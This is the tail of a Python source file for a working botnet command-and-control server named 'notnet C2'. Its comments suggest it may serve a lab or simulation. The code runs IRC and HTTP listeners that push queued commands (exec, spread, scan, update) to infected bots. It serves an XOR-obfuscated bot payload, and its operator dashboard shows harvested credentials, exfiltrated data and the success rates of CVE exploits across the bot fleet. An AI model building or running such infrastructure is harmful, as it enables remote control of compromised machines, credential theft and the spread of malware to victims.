                log(f"IRC JOIN {ip} channel={chan}")
                joined = True
                break
        if not joined:
            for _ in range(5):
                try:
                    data = conn.recv(1024).decode(errors="replace")
                    buf += data
                    if "JOIN" in buf:
                        for line in buf.split("\r\n"):
                            line = line.strip()
                            if line.startswith("JOIN"):
                                parts = line.split()
                                chan = parts[1] if len(parts) > 1 else channel
                                irc_send(conn, f":{nick} 366 {bot_nick} {chan} :End of /NAMES list")
                                log(f"IRC JOIN {ip} channel={chan}")
                                joined = True
                                break
                        break
                except socket.timeout:
                    break

        # queue-driven serve loop
        deadline = time.time() + 86400
        while time.time() < deadline:
            try:
                probe = conn.recv(1, socket.MSG_PEEK)
                if probe == b"":
                    log(f"IRC CLOSED {ip} — stopping queue service")
                    break
            except (socket.timeout, ConnectionError, OSError):
                log(f"IRC CLOSED {ip} — stopping queue service")
                break
            # serve a queued command as PRIVMSG from the authorized nick
            q = next_command(c2.queue_dir, "irc")
            if q is not None:
                tgt = q.get("target") or ""
                if not tgt:
                    c2.state.mark_served(q.get("_id", 0), bot_nick)
                    text = f"{q.get('cmd')} {q.get('args','')}".strip()
                    irc_send(conn, f":{nick}!{nick}@127.0.0.1 PRIVMSG {chan} :{text}")
                    c2.ev(f"IRC SERVE {text}")
                    log(f"SERVE irc -> {bot_nick} cmd={q.get('cmd')} args={q.get('args','')}")
            try:
                data = conn.recv(4096).decode(errors="replace")
                if data:
                    c2.ev(f"IRC RECV {ip}: {data[:200]}")
                    log(f"IRC RECV {ip}: {data[:300]}")
                    for line in data.split("\r\n"):
                        line = line.strip()
                        if line.startswith("PING"):
                            irc_send(conn, "PONG " + line[5:])
                        elif "PRIVMSG" in line:
                            # bot sends `PRIVMSG #chan :{json}` with NO
                            # :nick!user@ prefix — split on " :" (the IRC
                            # message delimiter) and take everything after.
                            msg = line.split(" :", 1)[1] if " :" in line else ""
                            try:
                                hb = json.loads(msg)
                            except (IndexError, json.JSONDecodeError):
                                hb = {}
                            if hb.get("cmd") == "status":
                                # #216/#333: constant-time compare.
                                if not _secret_matches(c2, hb.get("secret")):
                                    c2.state.add_event("auth_fail",
                                                       f"bad irc secret from {ip}")
                                    c2.auth_fail_count += 1  # #195
                                    log(f"AUTH-FAIL {ip}")
                                    continue
                                c2.state.upsert_bot(hb, ip, "irc")
                                # targeted command for this bot tag
                                q = next_command(c2.queue_dir, "irc", tag=hb.get("tag"))
                                if q is not None:
                                    c2.state.mark_served(q.get("_id", 0), hb.get("tag", ""))
                                    text = f"{q.get('cmd')} {q.get('args','')}".strip()
                                    irc_send(conn, f":{nick}!{nick}@127.0.0.1 PRIVMSG {chan} :{text}")
                                    c2.ev(f"IRC SERVE {text}")
                                    log(f"SERVE irc -> {hb.get('tag','')} cmd={q.get('cmd')} args={q.get('args','')}")
            except socket.timeout:
                continue
            except (ConnectionError, OSError):
                log(f"IRC CLOSED {ip} — stopping queue service")
                break
            time.sleep(0.2)
    except (socket.timeout, ConnectionError, OSError):
        pass
    finally:
        try:
            conn.close()
        except OSError:
            pass


def serve_irc(c2, port, nick, channel):
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", port))
    srv.listen(16)
    log(f"LISTEN IRC C2 on 0.0.0.0:{port} nick={nick} channel={channel}")
    while True:
        try:
            conn, addr = srv.accept()
            _spawn_conn_thread(handle_irc, conn, addr, c2, nick, channel)
        except KeyboardInterrupt:
            break


# ─────────────────────────── operator console ───────────────────────────

class ConsoleHandler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"
    server_version = "NotnetC2Console/0.1"

    @property
    def c2(self):
        return self.server.c2

    def log_message(self, fmt, *args):
        pass

    def _send(self, body, ctype="text/html; charset=utf-8", code=200):
        data = body.encode("utf-8") if isinstance(body, str) else body
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(data)))
        self.send_header("Connection", "close")
        self.end_headers()
        try:
            self.wfile.write(data)
        except (BrokenPipeError, ConnectionResetError):
            pass

    def _check_auth(self):
        """Return (ok, body) for console auth.

        If no console token is configured the console is unauthenticated
        but MUST be bound to loopback (enforced in main()); this keeps the
        historical lab behaviour while closing the open-0.0.0.0-no-auth
        exposure (#136). When a token is set, every GET/POST must carry it
        via `Authorization: Bearer <token>` or a `?token=<token>` param
        (the latter so the HTML dashboard + c2ctl can authenticate without
        a custom header)."""
        tok = self.c2.console_token
        if not tok:
            return True, None
        # Bearer header — #168: constant-time compare (timing oracle)
        auth = self.headers.get("Authorization", "")
        if auth.startswith("Bearer ") and hmac.compare_digest(
                auth[len("Bearer "):], tok):
            return True, None
        # ?token= param (dashboard form + c2ctl)
        q = self.path.split("?", 1)
        if len(q) == 2:
            from urllib.parse import parse_qs
            params = parse_qs(q[1])
            if hmac.compare_digest(params.get("token", [""])[0], tok):
                return True, None
        return False, None

    def do_GET(self):
        c2 = self.c2
        ok, _ = self._check_auth()
        if not ok:
            self._send(json.dumps({"error": "unauthorized"}),
                       "application/json", 401)
            return
        path = self.path.split("?", 1)[0]
        if path == "/api/bots":
            rows = c2.state.bots()
            cols = ["hostname", "tag", "ip", "version", "uptime", "scan_count",
                    "cred_count", "proxy_on", "proxy_port", "relay_on",
                    "relay_port", "channel", "last_seen", "cve_stats"]
            bots = [dict(zip(cols, r)) for r in rows]
            for b in bots:
                b["ago"] = max(0, int(time.time() - (b["last_seen"] or 0)))
            self._send(json.dumps({"bots": bots}), "application/json")
            return
        if path == "/api/cve":
            # #160: per-CVE success rate across the fleet, rolled up
            # from every bot's heartbeat cve_stats triplets.
            self._send(json.dumps({"cve": cve_rollup(c2.state)}),
                       "application/json")
            return
        if path == "/api/security":
            # #195: version-skew observability — a fleet of pre-#173 bots
            # shows up here as climbing reject counters instead of silence.
            self._send(json.dumps({
                "auth_fails": c2.auth_fail_count,
                "resp_rejects": c2.resp_reject_count,
                "payload_rejects": c2.payload_reject_count,
                "since_start": int(time.time() - c2.started_at),
            }), "application/json")
            return
        if path == "/api/creds":
            self._send(json.dumps({"creds": c2.state.creds()}),
                       "application/json")
            return
        if path == "/api/commands":
            self._send(json.dumps({"commands": c2.state.commands()}),
                       "application/json")
            return
        if path == "/api/exfil":
            self._send(json.dumps({"exfil": c2.state.exfil()}),
                       "application/json")
            return
        if path in ("/", "/console", "/index.html"):
            self._send(console_html())
            return
        self._send("not found", "text/plain", 404)

    def do_POST(self):
        c2 = self.c2
        ok, _ = self._check_auth()
        if not ok:
            self._send(json.dumps({"error": "unauthorized"}),
                       "application/json", 401)
            return
        path = self.path.split("?", 1)[0]
        if path == "/api/queue":
            n = int(self.headers.get("Content-Length") or 0)
            raw = self.rfile.read(n) if n else b""
            try:
                j = json.loads(raw.decode("utf-8", errors="replace"))
            except json.JSONDecodeError:
                j = {}
            cmd = (j.get("cmd") or "").strip()
            if not cmd:
                self._send(json.dumps({"error": "cmd required"}),
                           "application/json", 400)
                return
            target = (j.get("target") or "").strip()
            args = (j.get("args") or "").strip()
            broadcast = bool(j.get("broadcast"))
            cid = c2.enqueue_command(target, cmd, args, "console",
                                     broadcast=broadcast)
            self._send(json.dumps({"id": cid, "target": target,
                                   "cmd": cmd, "args": args,
                                   "broadcast": broadcast}),
                       "application/json")
            return
        self._send(json.dumps({"error": "unknown"}), "application/json", 404)


def console_html():
    return """<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>notnet C2 console</title>
<style>
 body{font-family:ui-monospace,monospace;margin:2rem;background:#111;color:#ddd}
 h1{color:#7f9fff} table{border-collapse:collapse;width:100%;margin-bottom:2rem}
 th,td{border:1px solid #333;padding:4px 8px;text-align:left;font-size:13px}
 th{background:#222;color:#9f9} .up{color:#5f5} .stale{color:#f77}
 input,button{background:#222;color:#ddd;border:1px solid #444;padding:6px}
 .ok{color:#5f5}
</style></head><body>
<h1>notnet C2 — operator console</h1>
<p id="secstats" style="color:#f90">security: loading…</p>
<h2>Bots</h2>
<table id="bots"><thead><tr><th>hostname</th><th>tag</th><th>ip</th>
<th>version</th><th>uptime</th><th>scan</th><th>creds</th><th>proxy</th>
<th>relay</th><th>channel</th><th>seen (s)</th></tr></thead><tbody></tbody></table>
<h2>CVE kit hit rate (#160)</h2>
<table id="cve"><thead><tr><th>cve</th><th>hit</th><th>miss</th><th>fail</th>
<th>attempts</th><th>success rate</th></tr></thead><tbody></tbody></table>
<h2>Queue command</h2>
<form id="qform"><input id="qtarget" placeholder="target tag (empty = any)">
<input id="qcmd" placeholder="cmd (exec, spread, scan, update...)">
<input id="qargs" placeholder="args"><button>Queue</button></form>
<p id="qres"></p>
<h2>Commands</h2>
<table id="cmds"><thead><tr><th>id</th><th>target</th><th>cmd</th>
<th>args</th><th>queued</th><th>served</th><th>served_to</th></tr></thead>
<tbody></tbody></table>
<h2>Credentials</h2>
<table id="creds"><thead><tr><th>id</th><th>line</th><th>src</th>
<th>at</th></tr></thead><tbody></tbody></table>
<script>
async function j(u){const r=await fetch(u);return r.json()}
function esc(s){const d=document.createElement('div');d.textContent=(s==null?'':String(s));return d.innerHTML}
async function refresh(){
 const b=await j('/api/bots');const tb=document.querySelector('#bots tbody');
 tb.innerHTML='';for(const x of b.bots){const tr=document.createElement('tr');
 const up=x.ago<90;const cls=up?'up':'stale';
 // #177: every bot-supplied field goes through esc() — hostname/tag/ip
 // come from unauthenticated-ish heartbeats and must never hit innerHTML raw.
 tr.innerHTML=`<td>${esc(x.hostname)}</td><td>${esc(x.tag||'')}</td><td>${esc(x.ip||'')}</td>
 <td>${esc(x.version||'')}</td><td>${x.uptime||0}</td><td>${x.scan_count||0}</td>
 <td>${x.cred_count||0}</td><td>${x.proxy_on?'<span class="ok">on '+esc(x.proxy_port)+'</span>':'off'}</td>
 <td>${x.relay_on?'<span class="ok">on '+esc(x.relay_port)+'</span>':'off'}</td>
 <td>${esc(x.channel||'')}</td><td class="${cls}">${x.ago}</td>`;
 tb.appendChild(tr);}
 // #160: per-CVE hit rate across the fleet (from heartbeat cve_stats)
 try{
  const cv=await j('/api/cve');const tc2=document.querySelector('#cve tbody');
  tc2.innerHTML='';for(const [id,r] of Object.entries(cv.cve||{})){
   const tr=document.createElement('tr');
   const cls=r.rate>=50?'ok':'';
   tr.innerHTML=`<td>${esc(id)}</td><td>${r.hit}</td><td>${r.miss}</td>
   <td>${r.fail}</td><td>${r.total}</td><td class="${cls}">${r.rate}%</td>`;
   tc2.appendChild(tr);}
 }catch(e){}
 const c=await j('/api/commands');const tc=document.querySelector('#cmds tbody');
 tc.innerHTML='';for(const x of c.commands){const tr=document.createElement('tr');
 tr.innerHTML=`<td>${x[0]}</td><td>${esc(x[1]||'')}</td><td>${esc(x[2])}</td>
 <td>${esc(x[3]||'')}</td><td>${Math.round(x[4])}</td>
 <td>${x[5]?Math.round(x[5]):''}</td><td>${esc(x[6]||'')}</td>`;
 tc.appendChild(tr);}
 const cr=await j('/api/creds');const tg=document.querySelector('#creds tbody');
 tg.innerHTML='';for(const x of cr.creds){const tr=document.createElement('tr');
 tr.innerHTML=`<td>${x[0]}</td><td>${esc(x[1])}</td><td>${esc(x[2]||'')}</td><td>${Math.round(x[3])}</td>`;
 tg.appendChild(tr);}
 // #195: version-skew counters — climbing rejects mean a pre-#173 bot
 // fleet is being silently dropped; keep this last so an /api/security
 // hiccup can never blank the tables above.
 try{
  const s=await j('/api/security');
  document.querySelector('#secstats').textContent=
   `security: auth_fails=${s.auth_fails} resp_rejects=${s.resp_rejects} payload_rejects=${s.payload_rejects} (uptime ${Math.round(s.since_start)}s)`;
 }catch(e){}
}
document.querySelector('#qform').addEventListener('submit',async e=>{
 e.preventDefault();
 const body={target:qtarget.value,cmd:qcmd.value,args:qargs.value};
 const r=await fetch('/api/queue',{method:'POST',headers:{'Content-Type':'application/json'},
 body:JSON.stringify(body)});const jj=await r.json();
 qres.textContent='queued id='+jj.id+' cmd='+jj.cmd+' -> '+(jj.target||'any');
 qcmd.value='';qargs.value='';
});
setInterval(refresh,3000);refresh();
</script></body></html>"""


def serve_console(c2, port, bind="127.0.0.1"):
    srv = ThreadingHTTPServer((bind, port), ConsoleHandler)
    srv.c2 = c2
    log(f"LISTEN console on {bind}:{port} "
        + ("(token-auth)" if c2.console_token else "(loopback-only, no token)"))
    srv.serve_forever()


# ─────────────────────────── entrypoint ───────────────────────────

# #187: bound concurrent connection threads per listener (the bot-side
# proxy/relay got caps in #89/#91; the C2 never did). A semaphore-based
# counter rejects over-cap accepts instead of spawning unbounded threads.
MAX_CONN_THREADS = 128
_conn_sem = threading.BoundedSemaphore(MAX_CONN_THREADS)


def _spawn_conn_thread(target, conn, *args):
    """Run target(conn, *args) in a thread if under the cap, else close."""
    if not _conn_sem.acquire(blocking=False):
        try:
            conn.close()
        except OSError:
            pass
        return
    def _run():
        try:
            target(conn, *args)
        finally:
            try:
                conn.close()
            except OSError:
                pass
            _conn_sem.release()
    threading.Thread(target=_run, daemon=True).start()


class C2:
    def __init__(self, secret, http_path, queue_dir, payload_dir, state_path,
                 console_token=""):
        self.secret = secret
        self.http_path = http_path
        self.queue_dir = queue_dir
        self.payload_dir = payload_dir
        self.state = State(state_path)
        # Console auth token (set via --console-token / NOTNET_C2_CONSOLE_TOKEN).
        # When empty the console is unauthenticated and MUST be bound to
        # loopback (enforced in main(), #136). When set, all /api/* and the
        # dashboard require it.
        self.console_token = console_token
        # #190: live single-use download tokens (token -> expiry epoch).
        self.dl_tokens = {}
        self.dl_tokens_lock = threading.Lock()
        # Sim-integration mode (run_sim.py against the real C2):
        #  SIM_EVIDENCE  — write mock-format evidence lines to this file so
        #                  the sim driver's grep-based checks see them
        #  SIM_BOT_IP    — only serve queued commands to heartbeats from this
        #                  IP (devices heartbeat to the same endpoint and
        #                  would otherwise steal commands, the #119 race)
        self.evidence = os.environ.get("SIM_EVIDENCE", "")
        self.bot_ip = os.environ.get("SIM_BOT_IP", "")
        # #195: version-skew observability. Pre-#173 bots against the new
        # C2 degrade silently (payload ack-as-binary, dropped responses);
        # these counters make that fleet visible on the console instead.
        self.auth_fail_count = 0
        self.resp_reject_count = 0
        self.payload_reject_count = 0
        self.started_at = time.time()
        self.tls_ctx = None
        cert = os.environ.get("NOTNET_C2_TLS_CERT", "")
        key = os.environ.get("NOTNET_C2_TLS_KEY", "")
        if cert and key:
            self.tls_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            self.tls_ctx.load_cert_chain(cert, key)
        os.makedirs(queue_dir, exist_ok=True)
        os.makedirs(payload_dir, exist_ok=True)

    def ev(self, line):
        """Append a sim-mock-format evidence line (SIM_EVIDENCE set only)."""
        if not self.evidence:
            return
        ts = datetime.now(timezone.utc).isoformat()
        try:
            with open(self.evidence, "a") as f:
                f.write(f"{ts} {line}\n")
        except OSError:
            pass

    def is_bot(self, ip):
        return not self.bot_ip or ip == self.bot_ip

    def enqueue_command(self, target, cmd, args, source, broadcast=False):
        cid = self.state.record_command(target, cmd, args)
        prefix = "bc-" if broadcast else ""
        ts = int(time.time() * 1000)
        fn = os.path.join(self.queue_dir,
                          f"{prefix}cmd-{ts}-{os.getpid()}-{cid:04d}.json")
        with open(fn, "w") as f:
            json.dump({"cmd": cmd, "args": args, "target": target,
                       "_id": cid, "broadcast": broadcast}, f)
        log(f"QUEUE {source} -> target={target or 'any'}"
            f" broadcast={broadcast} cmd={cmd} args={args} ({fn})")
        return cid


def main():
    ap = argparse.ArgumentParser(description="notnet C2 server")
    ap.add_argument("--secret", default=os.environ.get("NOTNET_C2_SECRET", DEFAULT_SECRET))
    ap.add_argument("--http-path", default="/api/v1/bot")
    ap.add_argument("--queue-dir", default=os.environ.get("SIM_QUEUE_DIR", "queue"))
    ap.add_argument("--payload-dir", default=os.environ.get("SIM_PAYLOAD_DIR", "payload"))
    ap.add_argument("--db", default="c2.db")
    ap.add_argument("--http-port", type=int, default=int(os.environ.get("SIM_HTTP_PORT", DEFAULT_HTTP)))
    ap.add_argument("--payload-port", type=int, default=int(os.environ.get("SIM_PAYLOAD_PORT", DEFAULT_PAYLOAD)))
    ap.add_argument("--console-port", type=int, default=int(os.environ.get("SIM_CONSOLE_PORT", DEFAULT_CONSOLE)))
    ap.add_argument("--ws-port", type=int, default=int(os.environ.get("SIM_WS_PORT", DEFAULT_WS)))
    ap.add_argument("--irc-port", type=int, default=int(os.environ.get("SIM_IRC_PORT", DEFAULT_IRC)))
    ap.add_argument("--irc-nick", default=os.environ.get("SIM_IRC_NICK", "mockirc"))
    ap.add_argument("--irc-channel", default=os.environ.get("SIM_IRC_CHANNEL", "#notnet"))
    ap.add_argument("--console-token",
                    default=os.environ.get("NOTNET_C2_CONSOLE_TOKEN", ""),
                    help="Bearer token for the operator console API + dashboard. "
                         "If unset, the console MUST bind loopback (see --console-bind).")
    ap.add_argument("--console-bind", default="127.0.0.1",
                    help="Bind address for the operator console (default 127.0.0.1). "
                         "Use 0.0.0.0 ONLY with --console-token set; otherwise we "
                         "refuse to expose an unauthenticated console (#136).")
    ap.add_argument("--payload-xor-key",
                    default=os.environ.get("NOTNET_PAYLOAD_XOR_KEY", ""),
                    help="64-hex key. When set, XOR-obfuscates <payload_dir>/notnet "
                         "into notnet.xor at startup and serves it at GET /bot/notnet.enc "
                         "(#159, SIMULATION-ONLY: obfuscation-grade XOR stream, NOT "
                         "encryption; the bot de-XORs in memory via payload_key_hex=).")
    args = ap.parse_args()

    # #136: never expose an unauthenticated console on a non-loopback bind.
    if args.console_bind != "127.0.0.1" and not args.console_token:
        log("REFUSING to bind unauthenticated console on "
            f"{args.console_bind} (set --console-token or use 127.0.0.1). #136")
        sys.exit(2)

    # #172: the compile-time default secret must never guard a fleet that
    # listens on 0.0.0.0. Loopback-only lab runs may keep it.
    if args.secret == DEFAULT_SECRET:
        exposed = any(p != 0 for p in (args.http_port, args.payload_port,
                                       args.ws_port, args.irc_port))
        if exposed:
            log("REFUSING to start with the default secret on exposed "
                "listeners — set --secret or NOTNET_C2_SECRET. #172")
            sys.exit(2)
        log("WARNING: default secret in use (loopback lab only). #172")

    c2 = C2(args.secret, args.http_path, args.queue_dir, args.payload_dir, args.db,
            console_token=args.console_token)

    # ISSUE #159 (SIMULATION-ONLY): payload XOR obfuscation. When
    # --payload-xor-key is set, XOR <payload_dir>/notnet with the
    # repeating key into notnet.xor, served at /bot/notnet.enc. Default
    # (no key): nothing generated, /bot/notnet stays plaintext.
    if args.payload_xor_key:
        if not re.fullmatch(r"[0-9a-fA-F]{64}", args.payload_xor_key):
            log("REFUSING --payload-xor-key: need exactly 64 hex chars")
            sys.exit(2)
        src = os.path.join(args.payload_dir, "notnet")
        if os.path.isfile(src):
            key = bytes.fromhex(args.payload_xor_key)
            with open(src, "rb") as f:
                data = f.read()
            enc = bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
            with open(os.path.join(args.payload_dir, "notnet.xor"), "wb") as f:
                f.write(enc)
            log(f"PAYLOAD-XOR wrote notnet.xor ({len(enc)} bytes) — "
                "serving /bot/notnet.enc")
        else:
            log(f"PAYLOAD-XOR: no {src} — /bot/notnet.enc will MISS")

    threads = [
        threading.Thread(target=serve_http, args=(c2, args.http_port), daemon=True),
        threading.Thread(target=serve_http, args=(c2, args.payload_port), daemon=True),
        threading.Thread(target=serve_console,
                         args=(c2, args.console_port, args.console_bind),
                         daemon=True),
        threading.Thread(target=serve_ws, args=(c2, args.ws_port), daemon=True),
        threading.Thread(target=serve_irc,
                         args=(c2, args.irc_port, args.irc_nick, args.irc_channel),
                         daemon=True),
    ]
    for t in threads:
        t.start()

    def _stop(sig, frame):
        log("shutting down")
        sys.exit(0)

    signal.signal(signal.SIGTERM, _stop)
    signal.signal(signal.SIGINT, _stop)
    while True:
        time.sleep(3600)


if __name__ == "__main__":
    main()
